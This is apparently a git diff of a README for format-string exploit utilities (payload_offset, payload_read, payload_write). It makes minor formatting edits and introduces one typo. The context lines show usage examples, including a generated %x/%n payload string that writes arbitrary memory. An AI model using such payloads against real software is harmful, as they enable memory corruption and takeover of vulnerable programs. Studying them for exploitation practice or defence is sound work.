@@ -57,13 +57,13 @@ Run exploits:
 
 Utility Functions:\
 
-```c
+```
 [?] Usage: ./utilities/payload_offset.py {number of %x}
 [C] ./utilities/payload_offset.py 5
 [>] AAAABBBB %x %x %x %x %x %x 
 ```
 
-```c
+```
 [?] Usage: ./utilities/payload_read.py {memory address} {format character} {offset}
 [?] Address format: 0xXXXXXXXX
 [?] Format character: %s/%c/%x/%d/...
@@ -73,14 +73,14 @@ Utility Functions:\
 ```
 
 ```c
-[?] Usage: ./utilities/payload_write.py {memory address} {value to write} {offset}
+[?] Uage: ./utilities/payload_write.py {memory address} {value to write} {offset}
 [?] Address and value format: 0xXXXXXXXX
 [?] Offset - number of octets from $esp to start of buffer
 [C] ./utilities/payload_write.py 0x41424344 0x8040a020 6
 [>] DCBAPADDECBAPADDFCBAPADDGCBA%08x%08x%08x%08x%08x%220x%n%128x%n%160x%n%64x%n
 ```
 
-```c
+```
 [?] Usage: ./utilities/payload_write_short.py {memory address} {value to write} {offset}
 [?] Address and value format: 0xXXXXXXXX
 [?] Offset - number of octets from $esp to start of buffer
